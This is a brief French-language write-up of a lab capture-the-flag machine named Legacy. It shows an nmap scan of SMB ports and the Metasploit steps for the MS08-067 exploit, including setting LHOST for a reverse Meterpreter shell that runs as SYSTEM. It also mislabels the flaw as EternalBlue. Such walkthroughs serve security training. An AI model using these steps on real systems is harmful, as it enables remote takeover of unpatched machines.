# Legacy

10.129.22.214


nmap :
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds


La room est tourné sur le protocole SMB
on sait qu'elle est vulnérable a une CVE de 2008 qui implqiue SMB
	CVE-2008-4250
	Ethernal Blue
	MS08-067


One peut chercher un exploit sur Metasploit
	msf > search CVE-2008-4250
		0   exploit/windows/smb/ms08_067_netapi
	
	use 0

	msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.22.214
	exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.158

	run



## Post Exploit

Pour savoir notre utilisateur :

	meterpreter > getuid 
		Server username: NT AUTHORITY\SYSTEM


On peut alors récuperer les flag de John et de Administritator
